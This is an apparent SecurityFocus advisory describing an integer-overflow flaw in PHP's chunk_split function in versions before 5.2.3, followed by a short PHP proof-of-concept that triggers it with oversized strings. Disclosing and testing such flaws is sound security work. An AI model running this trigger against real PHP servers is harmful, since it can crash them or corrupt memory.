source: http://www.securityfocus.com/bid/24261/info

PHP is prone to an integer-overflow vulnerability because it fails to ensure that integer values aren't overrun. Attackers may exploit this issue to cause a buffer overflow and to corrupt process memory.

Attackers may be able to execute arbitrary machine code in the context of the affected application. Failed exploit attempts will likely result in a denial-of-service condition.

This issue affects versions prior to PHP 5.2.3.

<?
          $a=str_repeat("A", 65535);
          $b=1;
          $c=str_repeat("A", 65535);
          chunk_split($a,$b,$c);
?>